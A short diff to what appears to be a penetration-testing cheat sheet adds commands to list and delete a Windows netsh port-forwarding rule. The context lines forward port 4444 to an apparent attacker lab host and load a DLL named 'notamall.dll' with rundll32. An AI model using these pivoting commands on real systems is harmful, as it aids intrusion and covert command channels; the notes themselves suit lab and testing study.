@@ -1154,3 +1154,5 @@ rundll32.exe shell32.dll,Control_RunDLL .\notamall.dll
 
 [portforward with netsh]
 netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
+netsh interface portproxy show.
+netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
